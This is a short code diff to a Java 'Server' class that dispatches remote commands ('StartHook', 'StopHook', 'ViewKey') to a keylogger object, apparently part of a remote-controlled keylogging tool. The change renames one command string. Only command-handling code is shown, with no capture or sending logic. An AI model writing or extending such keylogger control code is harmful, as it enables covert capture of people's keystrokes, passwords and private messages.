@@ -74,7 +74,7 @@ public class Server {
                 } else if (cmdString.equalsIgnoreCase("StartHook")) {
                     SendCommand("StartHook");
                     this.keyLogger.StartHooking();
-                } else if (cmdString.equalsIgnoreCase("StopHooking")) {
+                } else if (cmdString.equalsIgnoreCase("StopHook")) {
                     SendCommand("StopHook");
                     this.keyLogger.StopHooking();
                 } else if (cmdString.equalsIgnoreCase("ViewKey")) {
